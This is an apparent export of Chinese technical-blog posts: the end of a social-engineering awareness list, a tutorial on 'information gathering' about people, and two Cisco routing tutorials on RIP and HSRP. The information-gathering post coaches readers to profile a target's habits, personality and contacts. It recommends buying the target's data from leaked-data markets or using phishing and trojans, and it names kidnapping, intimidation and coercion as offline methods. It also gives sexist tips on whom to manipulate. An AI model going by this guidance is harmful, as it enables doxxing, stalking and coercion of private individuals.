title="2.欺骗和钩子"></a>2.欺骗和钩子</h3><p>随着攻击者更多地了解受害者，他们会寻找潜在的切入点。这些可能包括你的电子邮件地址、电话号码和社交媒体帐户，他们可以联系并为攻击打开大门的任何途径。</p><p>然后，他们用“钩子”伸出手来让你感兴趣。</p><p>例如，假设攻击者得到你刚考研的消息，他就可以伪造学校邮件发给你</p><h3 id="3-攻击"><a href="#3-攻击" class="headerlink" title="3. 攻击"></a>3. 攻击</h3><p>当钩子引诱你时，攻击者会执行几种类型的社会工程攻击之一。</p><p>例如，刚才的例子，你打开邮件填写信息的时候，你就已经暴露了。</p><p>在或者，链接中有一个针对微信的木马，你的微信账号和通讯录就会被盗取利用。</p><h3 id="4-消失"><a href="#4-消失" class="headerlink" title="4. 消失"></a>4. 消失</h3><p>一旦罪犯完成任务，他们就会消失，证据尽可能少。</p><p>检测网络攻击或数据泄露的平均时间接近 200 天，因此你甚至不知道发生了什么，直到它们早已消失</p><h2 id="三-12-种最常见的社会工程攻击类型"><a href="#三-12-种最常见的社会工程攻击类型" class="headerlink" title="三. 12 种最常见的社会工程攻击类型"></a>三. 12 种最常见的社会工程攻击类型</h2><h3 id="1-网络钓鱼攻击"><a href="#1-网络钓鱼攻击" class="headerlink" title="1. 网络钓鱼攻击"></a>1. 网络钓鱼攻击</h3><p>网络钓鱼是最常见的社会工程策略类型</p><p>当攻击者使用任何形式的通信（通常是电子邮件）来“钓鱼”以获取信息时，就会发生网络钓鱼攻击。</p><p>这些邮件看起来与来自受信任来源（如组织和你认识的人）的邮件相同。</p><p>例如，攻击者可能会向你发送一封声称来自你的银行的电子邮件，说明你的帐户密码已泄露。</p><p>由于电子邮件看起来合法且消息感觉紧急，因此你将快速单击包含的链接或扫描QR码并输入你的帐户信息（然后直接发送给攻击者）。</p><p>任何网络钓鱼攻击都有三个主要目标：</p><ul><li><ol><li><strong>让你点击一个链接。</strong> 网络钓鱼电子邮件通常包含在你的设备上安装恶意软件的链接。 </li></ol></li><li><ol><li><strong>让你下载附件。</strong> 攻击者还将恶意软件和病毒伪装成合法附件。例如，黑客会发送一封声称来自律师事务所的电子邮件，并附有“法院出庭通知”附件。但是当你下载它时，你的设备会被感染。</li></ol></li><li><ol><li><strong>让你在网站上输入你的凭据。</strong> 很多时候，黑客会试图让你访问一个看起来合法的网站并输入凭据。例如，他们会向你发送一封电子邮件，说明在线帐户已被盗用并更改你的密码。但是你输入的任何内容（用户名，密码等）都会直接发送给他们。</li></ol></li></ul><p>被盗凭据和恶意软件可能导致，你的身份被盗用到金融欺诈、帐户接管、企业间谍活动等。最简单的例子就是，用你的身份去贷款。</p><h3 id="2-鱼叉式网络钓鱼"><a href="#2-鱼叉式网络钓鱼" class="headerlink" title="2. 鱼叉式网络钓鱼"></a>2. 鱼叉式网络钓鱼</h3><p>正常的网络钓鱼攻击没有特定目标。但是，当黑客针对特定的个人或组织时，就会发生鱼叉式网络钓鱼攻击。</p><p>鱼叉式网络钓鱼的新做法称为钓鱼者网络钓鱼。当攻击者在社交媒体上冒充客户服务帐户以让你向他们发送登录信息时，就会发生这种情况。</p><h3 id="3-捕鲸"><a href="#3-捕鲸" class="headerlink" title="3. 捕鲸"></a>3. 捕鲸</h3><p>捕鲸是一个术语，用于描述针对特定、知名人士的网络钓鱼攻击。通常是高管、政府官员或名人。</p><p>捕鲸袭击的受害者被认为是网络犯罪分子的“大鱼”。这些目标为攻击者提供了巨大的潜力，他们要么拥有巨额财务支出，要么可以访问有价值的数据。</p><p>在名人被黑客入侵的情况下，攻击者希望找到妥协的照片，他们可以用来勒索高昂的赎金。</p><p>在另一个示例中，黑客向 C 级员工发送欺骗性电子邮件，这些电子邮件似乎来自受害者的组织内部。发件人声称知道同事的机密信息，但害怕亲自报告情况。他们会以电子表格、PDF 或幻灯片的形式共享他们的证据。但是，当受害者单击该链接时，他们会被带到恶意网站。如果他们尝试打开附件，恶意软件会感染他们的系统并传播到他们的网络。</p><h3 id="4-短信钓鱼和钓鱼"><a href="#4-短信钓鱼和钓鱼" class="headerlink" title="4. 短信钓鱼和钓鱼"></a>4. 短信钓鱼和钓鱼</h3><p>网络钓鱼并不总是局限于电子邮件和欺诈网站。</p><p>短信钓鱼是用于描述通过使用 SMS 文本消息进行的网络钓鱼的术语。攻击者购买欺骗性的电话号码，并发送包含恶意链接的消息。</p><p>还有钓鱼，与网络钓鱼相同，但通过电话完成。</p><p>网络钓鱼在企业中尤其普遍。攻击者会联系公司的前台、客户服务、人力资源或 IT，并声称需要有关员工的个人信息。</p><h3 id="5-引诱"><a href="#5-引诱" class="headerlink" title="5. 引诱"></a>5. 引诱</h3><p>诱饵是一种社会工程攻击，攻击者通过向受害者承诺有价值的回报来引诱他们提供敏感信息。</p><p>例如，攻击者会创建弹出广告，提供免费游戏、音乐或电影下载。如果你单击该链接，你的设备将感染恶意软件。</p><p>诱饵攻击也存在于现实世界中。</p><p>一个常见的例子是战略性地放置带一个诱人标签的U盘，比如一个写着”学习笔记“的移动硬盘或U盘。</p><p>好奇的你会拿起它并将其插入你们的工作站，然后你们的整个网络就被感染了。</p><h3 id="6-捎带-尾随"><a href="#6-捎带-尾随" class="headerlink" title="6. 捎带/尾随"></a>6. 捎带/尾随</h3><p>捎带和尾随都是指一种攻击类型，指的是授权人员允许未经授权的人员访问受限区域。</p><p>如果你让某人跟随你进入大楼，这种形式的社会工程可能会发生在你的工作场所或你的家中。</p><p>比如你走了结果你老婆让隔壁老王进了家。</p><p>攻击者可能打扮成送货司机，说他们忘记了身份证，或者假装他们是“新人”。进入后，他们可以监视人员，访问工作站，检查邮箱上的姓名等等。</p><p>尾随还包括允许未经授权的用户（如同事或孩子）访问你的公司设备。它们可能会使你的设备面临风险，并将恶意代码传播到公司的其他部门。</p><h3 id="7-Pretexting"><a href="#7-Pretexting" class="headerlink" title="7. Pretexting"></a>7. Pretexting</h3><p>我不知道这个应该怎么翻译……</p><p>当有人创建虚假角色或滥用其实际角色时，就会发生Pretexting。这是从内部发生数据泄露最常发生的情况。</p><p>这些攻击者使用他们的地位身份来建立信任，然后说服受害者向他们提供敏感数据。</p><p>比如一个男老师要求一位女学生放学留下……</p><h3 id="8-商业电子邮件入侵-（BEC）"><a href="#8-商业电子邮件入侵-（BEC）" class="headerlink" title="8. 商业电子邮件入侵 （BEC）"></a>8. 商业电子邮件入侵 （BEC）</h3><p>这个主要是用于商业上。</p><p>这个不太好说，举个例子吧。</p><p>你买了一个产品，用了一段需要保修，对方说会发给你一个链接并填写你的信息。</p><h3 id="9-技术支持攻击"><a href="#9-技术支持攻击" class="headerlink" title="9. 技术支持攻击"></a>9. 技术支持攻击</h3><p>这个简单，你请了一个技术指导，结果他是一个社工者，修电脑的同时给你加了个后门。</p><h3 id="10-钓凯子"><a href="#10-钓凯子" class="headerlink" title="10. 钓凯子"></a>10. 钓凯子</h3><p>这个方式有点像钓凯子。只可意会不可言传。</p><h3 id="11-恐吓软件"><a href="#11-恐吓软件" class="headerlink" title="11. 恐吓软件"></a>11. 恐吓软件</h3><p>当你看到这儿的时候，我要告诉你一个不幸的消息，该文章的URL被我植入了木马，你已经被攻击了……</p><p>这就是恐吓攻击</p><h3 id="12-Scareware"><a href="#12-Scareware" class="headerlink" title="12. Scareware"></a>12. Scareware</h3><p>这个玩应咱们国家玩的老溜了。</p><p>P2P下崽器，捆绑。</p><p>还有假网页，举个例子。</p><p>你登录京东，然后买了个东西。其实这个京东的网页是假的，你输入的信息被攻击者获取了，你付款的钱也没了。</p>]]></content>
      
      
      <categories>
          
          <category> 社会工程学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论如何通过不同方式收集信息</title>
      <link href="/2023/02/16/23/"/>
      <url>/2023/02/16/23/</url>
      
        <content type="html"><![CDATA[<p><strong>阅读前请注意，这篇文章只是我的个人想法，发生了什么与作者无关</strong></p><p>看到这个标题，你可能会好奇，这玩意还用教？搜就行了啊……</p><p>如果你有这种想法的话，我放一张前几天群友发的图片</p><p><img src="\media\2023\01\论如何通过不同方式收集信息1.webp" alt=""></p><p>请找到这个软件。</p><h2 id="一-什么是信息"><a href="#一-什么是信息" class="headerlink" title="一. 什么是信息"></a>一. 什么是信息</h2><p>什么是信息，这个问题似乎问的挺奇妙的。</p><p>下课铃是信息，说话是信息，光线是信息，手机，电脑，美食等等都是信息，那么到底什么是信息？</p><p>我们来想一下，下课了你会知道下课了，说话你会知道对方想表达给你的意图，光太亮了你会遮眼，你会吃美食，玩手机……</p><p>我认为，<strong>信息，就是能让你大脑产生活跃的一种东西</strong>。</p><p>我说的这句话你可能会更蒙了，你会感觉有的时候你没做出什么反应啊，觉得你的脑子也没怎么动。</p><p>我举个例子，你现在看向窗外，你可能没觉的怎么样，但是你的大脑会知道现在是上午，中午还是下午；你现在在哪，在家还是在外面，或者具体的一个地方；会知道有没有太阳或月亮，知道你现在的天气，知道你现在的动作是在看向窗外……</p><p>这些你确实没有感觉到，与其说是没有感觉到，不如说是你没想。</p><p>我们这里就又发现了一个事情，<strong>你想的，你感受到的，你大脑处理的，这些东西不是一码事</strong>，<strong>大脑处理的东西会影响你的潜意识。</strong> 潜意识又会影响你想的，你感受的。</p><p>这里，你有没有注意到，你一开始确实没有想那些东西，但是你看见我的内容后，你也会去想，这就是<strong>信息的引导</strong>。</p><p>这里最简单的例子就是：“看！飞碟！“然后你就去看了。</p><h2 id="二-什么是信息收集"><a href="#二-什么是信息收集" class="headerlink" title="二. 什么是信息收集"></a>二. 什么是信息收集</h2><p>信息收集不就是收集信息嘛，你会这么觉得，而且不用我说，你也知道信息收集是来收集有用的信息。</p><p>那么，你怎么判断信息是否有用？或者说，你觉得你收集信息的过程真的只是单纯的收集信息吗?</p><p>我认为，信息收集是一个解密的过程的，可以说，信息收集可以看作解密，注意，是 ”可以看作“</p><p>那么为啥？信息收集和解密还扯上关系了。这个我会在下面讲。</p><h2 id="三-如何收集信息"><a href="#三-如何收集信息" class="headerlink" title="三. 如何收集信息"></a>三. 如何收集信息</h2><h3 id="1-收集啥"><a href="#1-收集啥" class="headerlink" title="1. 收集啥"></a>1. 收集啥</h3><p>我们先来确定要收集什么？</p><p>身份证号码，手机号，性别，名字，网名，一堆账号，住址……</p><p>我们要尽可能的去收集<strong>你能知道的</strong>所有的信息</p><h4 id="1-收集人的信息"><a href="#1-收集人的信息" class="headerlink" title="(1) 收集人的信息"></a>(1) 收集人的信息</h4><p>收集一个人的信息，我们需要知道一下内容</p><ul><li>目标性别</li><li>目标习惯</li><li>目标喜好</li><li>目标性格</li><li>目标熟人</li><li>目标曾经去过的地点</li></ul><p>性别决定思维方式。平常情况下，在两方都不熟悉的情况下，建议先从女性下手，女性比男生更色，更冲动，更感性。如果是查熟人，建议从男的下手，男生不怎么会对熟人进行防备。如果你长得帅，直接搞女的就行，长得好看，直接搞男生。</p><p>习惯可以反推潜意识，可以反推性格。比如长的壮的更莽，冲动时说话更横。经常去健身房的更开朗，更自信等等。</p><p>喜好可以在一定程度上影响你和目标的关系，通过喜好可以进行更好的钓鱼，她喜欢猫，你就给她猫，喜欢小狗就给她小狗。</p><p>知道性格可以更好的制定话术，自信的人我们就恭维他，让他更自信；小心谨慎的人我们的话术就要懂得避重从轻，一点一点来</p><p>知道熟人的话可以间接认识或了解目标。</p><p>地点可以作为辅佐材料。</p><h4 id="2-收集事物"><a href="#2-收集事物" class="headerlink" title="(2) 收集事物"></a>(2) 收集事物</h4><p>收集一个事物，比如开头的软件，我们需要知道这个东西的来源有啥？</p><p>我们拿软件举例，软件的下载有这几种方式：贴吧、论坛、网站分享；下载站提供；个人软件在个人网站或者大型网站分享；各种云盘。</p><p>软件的分享一定有关于软件功能的介绍，我们可以从界面推断软件的功能。然后去找功能的描述。</p><p>如果知道了作者那就太简单了。</p><h3 id="2-去哪收集"><a href="#2-去哪收集" class="headerlink" title="2. 去哪收集"></a>2. 去哪收集</h3><p>那么我们去哪收集，我把收集的地点分为两种，虚拟环境和现实环境。</p><p>虚拟环境并不是网络，他代表不确定是否真实，比如他人的回忆，道听途说，QQ、微信上信息，网名等等</p><p>现实环境则是一定真实的环境，这个环境包含的挺少的，指纹，DNA这些。名字，身份证，照片都不算现实环境。</p><p>通常情况下，我们得到的是图片和视频，我们要尽可能的去提取有用的信息。</p><p>我这里提出几点</p><ul><li>直觉</li><li>建筑</li><li>影子</li><li>天气</li><li>环境</li><li>图片可视范围</li></ul><p>人的第一直觉是很准的，先跟着直觉走。</p><p>建筑物是非常重要的，如果有标志建筑物啥都不用说，直接就能找到人；没有标志建筑物可以通过建筑样式判断地区，北方多平房，南方房子多尖顶。</p><p>影子长度可以判断时间，影子是否明显可以判断位置和天气。</p><p>天气可以缩小范围</p><p>环境可以判断位置，缩小范围</p><p>图片的可视范围可以判断高度</p><h3 id="3-怎么收集"><a href="#3-怎么收集" class="headerlink" title="3. 怎么收集"></a>3. 怎么收集</h3><p>浏览器搜索就行，建议用谷歌浏览器，如果对方在暗网活动过，可以考虑用有洋葱浏览器。</p><p>还有一种就是线下，线下问，这个会单独出一篇博客。</p><p>收集的过程就有讲头了。</p><h4 id="1-收集人的信息-1"><a href="#1-收集人的信息-1" class="headerlink" title="(1) 收集人的信息"></a>(1) 收集人的信息</h4><p>我这里提供几个方法</p><ul><li>钓鱼，木马<br>如果你是一个技术者，就不需要我多说了，非技术者说了也不会。</li><li>社工库<br>去社工库里买目标的信息</li><li>线下<br>这里就多了，牵扯到身份地位，可信度，思维惯性等等知识。比如调查问卷，绑架恐吓，威逼利诱，假身份、假印象，人的弱点攻击等等。</li></ul><h4 id="2-收集软件"><a href="#2-收集软件" class="headerlink" title="(2) 收集软件"></a>(2) 收集软件</h4><p>建议用谷歌，百度直接搜。</p><h3 id="4-例子"><a href="#4-例子" class="headerlink" title="4. 例子"></a>4. 例子</h3><h4 id="1-开头例子"><a href="#1-开头例子" class="headerlink" title="(1) 开头例子"></a>(1) 开头例子</h4><p>我们就拿开头的图片举例。</p><p>这是一个软件的图片，我们直接扫描文字搜一下试试</p><p><img src="\media\2023\01\论如何通过不同方式收集信息2.webp" alt=""></p><p>找到图片出处，先简单看看，看不懂，好像是安卓逆向有关系，没啥用</p><p>搜armCode工具试试</p><p><img src="\media\2023\01\论如何通过不同方式收集信息3.webp" alt=""></p><p>我们试试找找，发现太多了，有些下载不了，有些感觉不像。</p><p>我们再次分析图片，观察特点。</p><p>我们大概猜测软件功能是：输入了nop，选择Thumb，点击生成机器码，得到右面的结果。</p><p>右面的结果分两个部分。</p><p><img src="\media\2023\01\论如何通过不同方式收集信息4.webp" alt=""></p><p>我们搜一下”nop生成机器码1 0000 C046“</p><p>谷歌没搜到，上百度。</p><p><img src="\media\2023\01\论如何通过不同方式收集信息5.webp" alt=""></p><p>我们猜测，nop的机器码是1 0000 C046，软件功能是选择Thumb等，把数据转换成机器码。</p><p>我们搜一下Thumb，Arm，aarch64转化机器码</p><p><img src="\media\2023\01\论如何通过不同方式收集信息6.webp" alt=""></p><p>得到一个论坛。</p><p><img src="\media\2023\01\论如何通过不同方式收集信息7.webp" alt=""></p><p>得到软件。</p><h4 id="2-搜地点"><a href="#2-搜地点" class="headerlink" title="(2) 搜地点"></a>(2) 搜地点</h4><p>我拿一个B站UP主的视频举例。</p><p>链接：<a href="https://www.bilibili.com/video/BV1Fv411V7cQ/?spm_id_from=333.788.recommend_more_video.0&amp;vd_source=3e0768b51e20067244fb77d108eb0418">哔哩哔哩_bilibili</a></p><p><img src="\media\2023\01\论如何通过不同方式收集信息8.webp" alt=""></p><p>这个还挺简单的</p><p>我们发现图片上有一个飞机翼。判断这是在飞机上拍的，民航飞机一般飞行高度在6000以上，图中的那条河在如此高度拍摄下还有个1厘米宽，说明这是个大河，我第一直觉是黄河。结合周围的地貌，这明显是水土流失的特征，所以这条河是黄河。</p><p>我们随便画画等势线，</p><p><img src="\media\2023\01\论如何通过不同方式收集信息9.webp" alt=""></p><p>图中大体方向是这样的，右面高于左面</p><p><img src="\media\2023\01\论如何通过不同方式收集信息10.webp" alt=""></p><p>说明水是这么流的，简单的初中地理知识</p><p><img src="\media\2023\01\论如何通过不同方式收集信息11.webp" alt=""></p><p>北半球南坡高于北坡，所以水是南北走向。</p><p>这里还是山区，我们可以简单的确定一下范围。</p><p>南北走向的话范围是这些</p><p><img src="\media\2023\01\论如何通过不同方式收集信息12.webp" alt=""></p><p>加上山区的话范围基本判定在右面的红框里。</p><p>我们再看一下图片</p><p><img src="\media\2023\01\论如何通过不同方式收集信息13.webp" alt=""></p><p>这玩应下面有个影子，这好像是个桥啊</p><p>这个图片经过压缩了，原图是有影子的，这里可能看得不太清楚</p><p>我们调整一下地图角度开始找。</p><p><img src="\media\2023\01\论如何通过不同方式收集信息14.webp" alt=""></p><p>找到目标</p><p><img src="\media\2023\01\论如何通过不同方式收集信息15.webp" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 社会工程学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态路由协议RIP</title>
      <link href="/2023/02/16/2/"/>
      <url>/2023/02/16/2/</url>
      
        <content type="html"><![CDATA[<h2 id="一-动态路由"><a href="#一-动态路由" class="headerlink" title="一. 动态路由"></a>一. 动态路由</h2><h3 id="1-简单了解"><a href="#1-简单了解" class="headerlink" title="1. 简单了解"></a>1. 简单了解</h3><p>我们知道，路由分静态路由和动态路由。</p><p>平常来说，静态路由用的比较多，但是在大型网络中，还是得用动态路由，不然一个一个跳得累死你，一直跳到你绝望为止。</p><p>静态路由是单向的，需要管理员手动配置；动态路由是在路由器上启用某动态路由协议。</p><p>不同的动态路由协议是不一样的，启用了动态路由协议后，进行自己直连的网段的宣告，从而相邻的路由器就可以学习到相邻的路由器所宣告的网段。</p><p>举个例子，张三认识李四，李四认识王五，那么张三就可以通过李四认识王五。</p><p><img src="\media\2023\02\动态路由协议1.webp" alt=""></p><p>比如是这样的一个网络。R1连着10网段和20网段，然后它把这两个网段宣告给与自己直连的路由器，即R2。</p><p>这时候R2就学习到了10网段和20网段，同时R2自己还连着30网段，所以它现在就会10，20，30三个网段了。然后再宣告给自己直连的路由器，即R1和R3。</p><p>R1和R3就学习到了10，20，30这三个网段。R3同时连着40网段，它现在就会了10，20，30，40四个网段。然后再宣告给R2，R2就会了，R2再宣告给给R1和R3，R1也会。</p><p>这样所有的路由器学会了所有的网段。</p><h3 id="2-常见的动态路由"><a href="#2-常见的动态路由" class="headerlink" title="2. 常见的动态路由"></a>2. 常见的动态路由</h3><ul><li>RIP：路由信息协议（距离矢量路由协议）</li><li>OSPF：开放式最短路径优先</li><li>BGP：边界网关协议</li><li>EIGRP：增强内部网关路由协议</li><li>IS-IS：中间系统到中间系统</li></ul><p>每个协议的算法都不一样的。</p><p>我们这里主要讲一下RIP</p><h3 id="3-动态路由的特点"><a href="#3-动态路由的特点" class="headerlink" title="3. 动态路由的特点"></a>3. 动态路由的特点</h3><ul><li>减少管理员的工作量</li><li>增加网络带宽</li></ul><h3 id="4-什么是内部，什么是边界"><a href="#4-什么是内部，什么是边界" class="headerlink" title="4. 什么是内部，什么是边界"></a>4. 什么是内部，什么是边界</h3><p>AS（自治系统）：运行相同的路由协议的路由器属于同一个AS</p><p>通过AS内连接外部的路由器，这时候就需要有外部网关</p><ul><li>内部网关路由协议（IGP）：用于在单一AS内去决策路由的，比如RIP，OSPF等</li><li>外部网关路由协议（EGP）： 用于连接不同的AS，比如BGP</li></ul><p><img src="\media\2023\02\动态路由协议2.webp" alt=""></p><p>比如这个网络，左面的三个设备用RIP协议，他们三儿是同一个AS；右面的两个路由器用OSPF协议，他们俩是同一个AS。</p><p>我们现在有两个不同AS的两个路由器想要连接，就需要用到BGP。</p><p>所以这两个路由器不仅要用内部的协议，还要用外部的协议，然后它俩才能互相宣告。</p><h3 id="5-动态路由需要考虑的内容"><a href="#5-动态路由需要考虑的内容" class="headerlink" title="5. 动态路由需要考虑的内容"></a>5. 动态路由需要考虑的内容</h3><h4 id="1-度量值"><a href="#1-度量值" class="headerlink" title="(1) 度量值"></a>(1) 度量值</h4><p>度量值：跳数，带宽，负载，时延，成本……</p><p>假如说跳数为3，意味着它只能从自己开始跳三个路由器</p><p>比如这个网络中，红色的路由器可以学习到并且只能学习到这个范围的网段。</p><p><img src="\media\2023\02\动态路由协议3.webp" alt=""></p><h4 id="2-收敛"><a href="#2-收敛" class="headerlink" title="(2) 收敛"></a>(2) 收敛</h4><p>收敛：使所有路由器的路由表都达成一致的状态</p><p>你可以理解为全部学习完。</p><p><img src="\media\2023\02\动态路由协议4.webp" alt=""></p><p>在这里，红色路由器需要学习三次才可以全部学习完，红色的是第一次学习，蓝色的是第二次学习，黄色的是第三次学习。</p><p>如果在复杂的网络中，会需要学习好几次，收敛就慢。</p><h4 id="3-AS"><a href="#3-AS" class="headerlink" title="(3) AS"></a>(3) AS</h4><p>刚才讲过了。</p><h2 id="二-RIP动态路由协议"><a href="#二-RIP动态路由协议" class="headerlink" title="二. RIP动态路由协议"></a>二. RIP动态路由协议</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h3><p>它是一种内部网关路由协议，在单一AS中内的路由器协议。</p><p>靠跳数来衡量到达目的的距离。最大15跳，16跳表示不可达，每个30秒向相邻的路由器发送路由更新消息，采用UDP的520端口。</p><p>下图是初始状态</p><p><img src="\media\2023\02\动态路由协议5.webp" alt=""></p><p>然后我们配置RIP，在第一个更新周期里面，路由器会向相邻的路由器发送他自己的路由表。</p><p><strong>第一个周期：</strong></p><p>R1从R2中学到30网段；R2从R1和R4中学到10网段和40网段；R3从R2中学习到20网段。</p><p><img src="\media\2023\02\动态路由协议6.webp" alt=""></p><p><strong>第二个周期：</strong></p><p><img src="\media\2023\02\动态路由协议7.webp" alt=""></p><p>这样所有的路由器的路由表达成一致，路由器收敛完成。</p><p>RIP动态路由协议是从相邻的路由器去学习对应的路由条目</p><h3 id="2-RIP的版本"><a href="#2-RIP的版本" class="headerlink" title="2. RIP的版本"></a>2. RIP的版本</h3><p>RIP有两个版本：</p><h4 id="1-RIPv1"><a href="#1-RIPv1" class="headerlink" title="(1) RIPv1"></a>(1) RIPv1</h4><p>RIPv1称为有类路由协议，采用标准子网掩码</p><p>特点：</p><ul><li>采用广播更新</li><li>不支持VLSM（可变长子网掩码，非标准子网掩码）</li><li>自动路由汇总，不可关闭</li><li>不支持不连续子网</li></ul><p>广播更新有个bug，就是它是向所有设备发送广播。</p><p><img src="\media\2023\02\动态路由协议8.webp" alt=""></p><p>这个R4它没有RIP，意味着我们不需要给它发送RIP信息，但是R1会给所有与他相连的路由器发送广播，那么R4接不接，人间R4跟你都没关系，当然不会接收了，这样就会导致过多的流量产生。</p><p>那么我们有没有方式让它只向运行RIP的设备发呢？</p><p>自动路由汇总的意思就是说，他会把路由表的数据自动汇总成一个网段。</p><p>比如路由表里头有两个网段,192.168.10.0/24 和 192.168.20.0/24，RIP就会把他们自动汇总成 192.168.0.0/16</p><p><img src="\media\2023\02\动态路由协议9.webp" alt=""></p><h4 id="2-RIPv2"><a href="#2-RIPv2" class="headerlink" title="(2) RIPv2"></a>(2) RIPv2</h4><p>RIPv2是无类路由协议（可以使用非标准子网掩码）</p><p>特点：</p><ul><li>组播更新（只会向运行RIP的路由器发送更新消息）</li><li>支持VLSM</li><li>自动汇总，可以关闭</li><li>支持不连续的子网</li></ul><h3 id="3-RIP的配置"><a href="#3-RIP的配置" class="headerlink" title="3. RIP的配置"></a>3. RIP的配置</h3><h4 id="1-RIPv1-1"><a href="#1-RIPv1-1" class="headerlink" title="(1) RIPv1"></a>(1) RIPv1</h4><p>这样一个网络</p><p><img src="\media\2023\02\动态路由协议10.webp" alt=""></p><p>接口处我就用<code>.254</code>这样的来简写了，比如网段是<code>192.168.30.0/24</code>，<code>.254</code>就是<code>192.168.30.254</code></p><p>我们简单配置一下IP地址</p><p>之后就可以配置RIP了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">路由器2</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">router rip  // 启用RIP</span><br><span class="line">netword 192.168.10.0  // 宣告与路由器直连的网段</span><br><span class="line">netword 192.168.30.0</span><br><span class="line">netword 192.168.40.0</span><br></pre></td></tr></table></figure><p>其他的也一样。</p><p>我们看一下路由表</p><p><img src="\media\2023\02\动态路由协议11.webp" alt=""></p><p>可以看到，自动生成了一堆路由条目。</p><p>我们直接ping一下</p><p><img src="\media\2023\02\动态路由协议12.webp" alt=""></p><p>可以看到能ping通</p><p>他是现在每个路由器上进行ARP广播，然后在进行ICMP，所以它一开始的两个是 time out</p><h4 id="1-RIPv2"><a href="#1-RIPv2" class="headerlink" title="(1) RIPv2"></a>(1) RIPv2</h4><p>我们整一个非标准的子网掩码的网络</p><p><img src="\media\2023\02\动态路由协议13.webp" alt=""></p><p>配置一下IP，注意子网掩码是 255.255.255.192</p><p>我们进行配置RIP宣告</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">路由器1</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">router rip</span><br><span class="line">version 2  // RIPv2</span><br><span class="line">network 192.168.1.0</span><br><span class="line">network 192.168.1.64</span><br></pre></td></tr></table></figure><p>其他的同理</p><p>我们看一下路由表</p><p><img src="\media\2023\02\动态路由协议14.webp" alt=""></p><p>可以看到它把路由表汇总成了一个 192.168.1.0/24的网段。</p><p>那么如果你不想要自动汇总怎么办呢?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router rip</span><br><span class="line">no auto-summary  // 关闭</span><br></pre></td></tr></table></figure><p>如果不想汇总的话，这个代码记得在设置RIP前就用，要不然之后需要全部路由器重新设置IP。</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>热备份路由选择协议HSRP</title>
      <link href="/2023/02/16/25/"/>
      <url>/2023/02/16/25/</url>
      
        <content type="html"><![CDATA[<h2 id="一-冗余和负载"><a href="#一-冗余和负载" class="headerlink" title="一. 冗余和负载"></a>一. 冗余和负载</h2><h3 id="1-冗余"><a href="#1-冗余" class="headerlink" title="1. 冗余"></a>1. 冗余</h3><p><strong>冗余就是备份</strong></p><p>我们看一下这个图：</p><p><img src="\media\2023\02\热备份路由选择协议HSRP1.webp" alt=""></p><p>这两个主机想要访问外网，默认路线是走二层SW，R1然后到外网，如果R1坏了，就会启用R2。这就是冗余，这是一个自动的过程</p><p><strong>我们本篇文章讲的就是冗余。</strong></p><h3 id="2-负载"><a href="#2-负载" class="headerlink" title="2. 负载"></a>2. 负载</h3><p><strong>负载就是分摊工作</strong></p><p>还是上面那个图，刚才是主机1和主机2同时经过一个路由器，我们现在这样，主机1走R1，主机2走R2，这样每一台路由器都分摊了一部分工作。</p><p>这就是负载</p><h2 id="二-HSRP概念"><a href="#二-HSRP概念" class="headerlink" title="二. HSRP概念"></a>二. HSRP概念</h2><p><img src="\media\2023\02\热备份路由选择协议HSRP2.webp" alt=""></p><p>我们知道，主机向外通信的时候，一点有IP地址，子网掩码和网关，网关就是和主机直连的路由器，那么现在这张图，主机1的网关是哪个？</p><p>如果是R1的话，那么R1的IP地址就是主机1的网关。那如果R1坏了的话，根据冗余，我们的流量就会从R2走，那意味着，主机1的网关还要重新配置成R2的IP，非常不灵活，我们想要的是让它自动切换。</p><p>HSRP是在两个路由器中间加了一个虚拟路由器的概念，</p><p><img src="\media\2023\02\热备份路由选择协议HSRP3.webp" alt=""></p><p>我们讲主机的网关配置未虚拟路由器R3的IP。</p><p>R1和R2有两种状态，活跃和非活跃。好的就是活跃，坏了就是非活跃。</p><p>当R1和R2都是活跃的时候，用默认的，会把数据转发给R1。当R1坏了，状态变为非活跃，R2是活跃，R3就会把数据转发给R2。</p><h3 id="1-HSRP组中成员"><a href="#1-HSRP组中成员" class="headerlink" title="1. HSRP组中成员"></a>1. HSRP组中成员</h3><h4 id="1-活跃路由器"><a href="#1-活跃路由器" class="headerlink" title="(1) 活跃路由器"></a>(1) 活跃路由器</h4><p>活跃路由器是专门来转发数据包的</p><p>活跃路由器会向整个组中不断的发送hello消息，来保持活跃状态。</p><p>意思就是说，他会向组一直发送HSRP消息，告诉组，他还没挂，还能干活。你备份路由器想启用，没门。</p><p>既然是发送消息，那肯定有一个超时时间。假如超时时间是2秒，备份路由器有2秒没收到来自活跃路由器的消息，他就会判定，活跃路由器挂掉了，然后它启用。</p><h4 id="2-备份路由器"><a href="#2-备份路由器" class="headerlink" title="(2) 备份路由器"></a>(2) 备份路由器</h4><p>备份路由器承担备份角色，专门去监听。</p><p>他也会承担一部分传输hello消息的报文，即不仅仅活跃路由器会向备份路由器发报文，备份路由器也会向活跃路由器发。</p><p>备份路由器：”哥们，我还活着，你挂没挂？“</p><p>活跃路由器：”我还活着！“</p><p>就是这么个意思。如果活跃路由器挂了。</p><p>备份路由器：”哥们，我还活着，你挂没挂？“</p><p>活跃路由器：”……“</p><p>备份路由器：”你不回复我，我就当你挂了哈“</p><p>然后备份路由器启用</p><h4 